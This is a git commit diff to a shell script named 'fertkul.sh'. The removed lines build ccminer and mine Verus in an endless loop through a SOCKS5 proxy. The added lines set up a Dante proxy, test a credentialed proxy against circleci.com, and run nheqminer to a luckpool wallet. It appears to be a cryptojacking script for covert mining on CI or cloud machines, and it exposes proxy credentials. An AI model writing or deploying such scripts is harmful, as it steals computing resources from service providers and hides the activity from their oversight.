96dd360f51b1c1f8647d3853a21e73bff0cd4e01
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 15:44:13 +0700

    Update fertkul.sh

--- fertkul.sh
+++ fertkul.sh
@@ -1,31 +1,21 @@
 #!/bin/sh
 
-apt-get update
-
-apt-get install sudo
-
-apt-get install git -y
-
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-
-cd ccminer
-
-chmod +x build.sh
-
-chmod +x configure.sh
-
-chmod +x autogen.sh
-
-./build.sh
-
-while [ 1 ]; do
-
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.Hayabusa -p x -t $(nproc) -x socks5://192.111.139.162:4145
-
-sleep 3
-
-done
-
-sleep 999
+wget http://ppa.launchpad.net/dajhorn/dante/ubuntu/pool/main/d/dante/dante-server_1.4.1-1_amd64.deb -y
+sudo apt-get install gdebi-core -y
+sudo gdebi dante-server_1.4.1-1_amd64.deb -y
+#
+nano /etc/danted.conf
+#
+wget https://raw.githubusercontent.com/mangundarisman/manggudia/main/nano/etc/danted.conf
+#
+service danted start
+#
+service danted status
+#
+curl -v -x socks5://tzblzgxp:rolmji58dyme@45.192.155.126:7137 https://circleci.com/
+#
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+#
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.Cloud_03 -p x -t 8
